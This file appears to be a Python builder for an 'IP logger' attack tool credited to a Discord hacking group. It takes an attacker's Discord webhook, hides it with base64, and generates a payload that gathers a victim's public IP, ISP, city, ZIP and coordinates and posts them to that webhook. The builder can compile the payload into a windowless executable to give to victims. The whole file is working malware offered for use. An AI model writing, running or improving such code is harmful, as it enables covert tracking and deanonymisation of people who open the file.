import os
import base64
import subprocess
import shutil

def main():
    ascii_art = r"""
           ____         __                                   _    _____ 
          /  _/___     / /   ____  ____ _____ ____  _____   | |  / /__ \
          / // __ \   / /   / __ \/ __ `/ __ `/ _ \/ ___/   | | / /__/ /
         / // /_/ /  / /___/ /_/ / /_/ / /_/ /  __/ /       | |/ // __/ 
        /___/ .___/  /_____\____/\__, /\__, /\___/_/        |___//____/ 
           /_/                   /____//____/                            
"""
    print(ascii_art)
    webhook = input("ENTER WEBHOOK: ")
    file_type = input("Py or exe: ").strip().lower()
    encoded_webhook = base64.b64encode(webhook.encode()).decode()
    
    if not os.path.exists("Disk"):
        os.makedirs("Disk")
    
    logger_code = f"""
import requests
import base64

def get_ip_info():
    try:
        ip = requests.get("https://api64.ipify.org?format=json").json().get("ip")
        details = requests.get(f"http://ip-api.com/json/{{ip}}").json()
        return ("\\n------------ @everyone -----------"
                f"\\nIP: {{details.get('query')}}"
                f"\\nISP: {{details.get('isp')}}"
                f"\\nCountry: {{details.get('country')}}"
                f"\\nRegion: {{details.get('regionName')}}"
                f"\\nCity: {{details.get('city')}}"
                f"\\nZIP: {{details.get('zip')}}"
                f"\\nLat: {{details.get('lat')}}"
                f"\\nLon: {{details.get('lon')}}"
                "\\n------------ CREDITS --------------"
                "\\nIp Logger By: https://discord.gg/darktools"
                "\\n-------------------------------------\\n")
    except Exception as e:
        return f"Error retrieving IP info: {{e}}"

webhook = base64.b64decode("{encoded_webhook}").decode()
requests.post(webhook, json={{"content": get_ip_info()}})
    """
    
    logger_path = "Disk/Ip_Logger.py"
    with open(logger_path, "w", encoding="utf-8") as file:
        file.write(logger_code)
    
    print("Logger script saved in 'Disk/Ip_Logger.py'.")
    
    if file_type == "exe":
        print("Converting to EXE...")
        if not shutil.which("pyinstaller"):
            print("Error: PyInstaller is not installed. Run 'pip install pyinstaller'.")
        else:
            subprocess.run(["pyinstaller", "--onefile", "--noconsole", logger_path], shell=True)
            print("EXE file saved in 'Disk/dist'.")
    
    input("\nPress Enter to exit...") 
if __name__ == "__main__":
    main()
